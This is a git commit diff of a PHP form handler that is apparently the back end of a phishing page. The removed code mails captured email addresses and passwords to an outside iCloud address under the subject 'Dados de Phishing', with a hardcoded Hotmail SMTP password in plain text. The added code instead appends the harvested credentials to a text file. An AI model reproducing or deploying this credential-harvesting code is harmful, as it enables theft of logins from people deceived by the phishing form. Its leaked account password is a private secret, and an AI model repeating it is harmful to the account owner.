9bcff29de0e06f727f13c5ab18c3a682ac21cc3c
Lomb4da <lombo05.abracador@icloud.com>
2024-05-20 02:03:15 -0300

    Update processar_formulario.php

--- processar_formulario.php
+++ processar_formulario.php
@@ -1,34 +1,17 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Captura os dados do formulário
-    $email = $_POST['email'];
-    $senha = $_POST['senha'];
+    $email = htmlspecialchars($_POST['email']);
+    $senha = htmlspecialchars($_POST['senha']);
 
-    // Configurações do servidor SMTP
-    $host = 'smtp.office365.com';
-    $port = 587;
-    $username = 'lomb4da@hotmail.com';
-    $password = 'N5987@#$ok';
-    
-    // Endereço de e-mail para onde os dados serão enviados
-    $destinatario = 'lombo05.abracador@icloud.com';
-    
-    // Constrói o corpo do e-mail
-    $assunto = 'Dados de Phishing';
-    $mensagem = "Email: $email\nSenha: $senha";
+    // Define o caminho do arquivo onde os dados serão salvos
+    $arquivo = 'resultados.txt';
 
-    // Configurações adicionais para o envio de e-mail
-    $cabecalhos = array(
-        'From' => $username,
-        'Reply-To' => $email,
-        'X-Mailer' => 'PHP/' . phpversion()
-    );
+    // Formata a string a ser salva
+    $dados = "Email: $email\nSenha: $senha\n\n";
 
-    // Envia o e-mail
-    if (mail($destinatario, $assunto, $mensagem, $cabecalhos)) {
-        echo "E-mail enviado com sucesso!";
-    } else {
-        echo "Erro ao enviar o e-mail.";
-    }
+    // Salva os dados no arquivo
+    file_put_contents($arquivo, $dados, FILE_APPEND);
+
+    echo "Dados salvos com sucesso!";
 }
 ?>
